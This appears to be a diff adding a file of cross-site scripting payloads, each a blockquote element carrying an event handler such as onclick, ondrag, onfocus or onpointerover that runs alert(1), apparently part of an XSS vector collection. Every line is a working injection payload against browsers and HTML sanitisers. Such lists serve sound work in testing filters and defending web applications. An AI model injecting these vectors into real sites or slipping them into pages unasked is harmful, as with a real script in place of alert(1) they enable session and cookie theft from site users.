@@ -1,0 +1,38 @@
+<blockquote contenteditable onbeforeinput=alert(1)>test
+<blockquote draggable="true" ondrag="alert(1)" style=display:block>test</blockquote>
+<blockquote draggable="true" ondragend="alert(1)" style=display:block>test</blockquote>
+<blockquote draggable="true" ondragenter="alert(1)" style=display:block>test</blockquote>
+<blockquote draggable="true" ondragleave="alert(1)" style=display:block>test</blockquote>
+<blockquote draggable="true" ondragstart="alert(1)" style=display:block>test</blockquote>
+<blockquote id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></blockquote>
+<blockquote id=x tabindex=1 onfocus=alert(1)></blockquote>
+<blockquote id=x tabindex=1 onfocusin=alert(1)></blockquote>
+<blockquote onafterscriptexecute=alert(1)><script>1</script>
+<blockquote onbeforescriptexecute=alert(1)><script>1</script>
+<blockquote onblur=alert(1) id=x tabindex=1 style=display:block>test</blockquote><input value=clickme>
+<blockquote onclick="alert(1)" style=display:block>test</blockquote>
+<blockquote oncontextmenu="alert(1)" style=display:block>test</blockquote>
+<blockquote oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<blockquote oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<blockquote ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</blockquote>
+<blockquote onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</blockquote><input value=clickme>
+<blockquote onkeydown="alert(1)" contenteditable style=display:block>test</blockquote>
+<blockquote onkeypress="alert(1)" contenteditable style=display:block>test</blockquote>
+<blockquote onkeyup="alert(1)" contenteditable style=display:block>test</blockquote>
+<blockquote onmousedown="alert(1)" style=display:block>test</blockquote>
+<blockquote onmouseenter="alert(1)" style=display:block>test</blockquote>
+<blockquote onmouseleave="alert(1)" style=display:block>test</blockquote>
+<blockquote onmousemove="alert(1)" style=display:block>test</blockquote>
+<blockquote onmouseout="alert(1)" style=display:block>test</blockquote>
+<blockquote onmouseover="alert(1)" style=display:block>test</blockquote>
+<blockquote onmouseup="alert(1)" style=display:block>test</blockquote>
+<blockquote onmousewheel=alert(1) style=display:block>requires scrolling
+<blockquote onpointerdown=alert(1) style=display:block>XSS</blockquote>
+<blockquote onpointerenter=alert(1) style=display:block>XSS</blockquote>
+<blockquote onpointerleave=alert(1) style=display:block>XSS</blockquote>
+<blockquote onpointermove=alert(1) style=display:block>XSS</blockquote>
+<blockquote onpointerout=alert(1) style=display:block>XSS</blockquote>
+<blockquote onpointerover=alert(1) style=display:block>XSS</blockquote>
+<blockquote onpointerrawupdate=alert(1) style=display:block>XSS</blockquote>
+<blockquote onpointerup=alert(1) style=display:block>XSS</blockquote>
+<blockquote onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></blockquote>
